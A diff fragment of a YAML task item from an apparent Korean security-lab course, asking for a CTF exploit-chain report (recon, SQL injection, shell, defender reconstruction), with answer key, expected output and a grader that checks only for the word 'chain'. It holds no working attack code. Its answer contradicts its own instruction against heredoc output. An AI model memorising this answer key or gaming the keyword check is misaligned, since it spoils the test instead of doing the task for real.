+    hint: '정찰→체인→플래그→방어'
+    category: report
+    points: 10
+    answer: |
+      # (편집기로 작성한 CTF 침투 보고서 — 채점용)
+      ssh att@192.168.0.202 'cat > ~/w08_ctf_report.md <<'"'"'EOF'"'"'
+      # 공격 W08 — CTF 익스플로잇 체인 보고서
+      ## 1. 정찰 : nmap으로 표면(포트/vhost) 식별
+      ## 2. 익스플로잇 체인 : 정찰 → 웹 익스플로잇(SQLi 942, exploit=403) → 발판 → 셸
+      ## 3. 플래그 : 셸 캡처(리스너 포트 48008 = 코드 실행 거점, ss로 확인)
+      ## 4. 방어자 : WAF(913/942) + IDS(sid 9408001) + 호스트(48008) 흔적을 출처 192.168.0.202로 체인 역재구성
+      ## 결론 : 개별 취약점을 체인으로 엮어 코드 실행까지 도달. 방어는 어느 단계서든 체인을 끊으면 막는다
+      EOF
+      cat ~/w08_ctf_report.md'
+    answer_detail: "편집기로 ~/w08_ctf_report.md 를 작성해 개별 기법(W01–W07)을 익스플로잇 체인으로 종합한다(PTES 6단계 보고). 정찰→침투(SQLi 942)→셸(플래그 48008)의 경로를 증거와 함께 정리하고, 방어자 관점으로 흩어진 흔적(WAF 913/942 + IDS 9408001 + 호스트 포트)을 출처 IP로 역재구성해 어느 단계서든 체인을 끊는다는 결론. 출력에 '체인' 키워드가 포함되면 통과. 보고서는 heredoc 출력이 아니라 편집기로 직접 쓴 산출물이라야 하며, 발견을 단일 취약점 나열이 아닌 경로로 설명하는 것이 핵심."
+    expected_output: |
+      # 공격 W08 — CTF 익스플로잇 체인 보고서
+      ## 1. 정찰 : nmap으로 표면(포트/vhost) 식별
+      ## 2. 익스플로잇 체인 : 정찰 → 웹 익스플로잇(SQLi 942, exploit=403) → 발판 → 셸
+      ## 3. 플래그 : 셸 캡처(리스너 포트 48008 = 코드 실행 거점, ss로 확인)
+      ## 4. 방어자 : WAF(913/942) + IDS(sid 9408001) + 호스트(48008) 흔적을 출처 192.168.0.202로 체인 역재구성
+      ## 결론 : 개별 취약점을 체인으로 엮어 코드 실행까지 도달. 방어는 어느 단계서든 체인을 끊으면 막는다
+    verify:
+      type: output_contains
+      expect: '체인'
+      field: stdout
+      semantic:
+        intent: "CTF 익스플로잇 체인 종합 보고"
+        success_criteria: ["정찰/체인/플래그/방어"]
+        acceptable_methods: ["**[관리적] CTF 보고서 (권장)**"]
+    target_vm: web
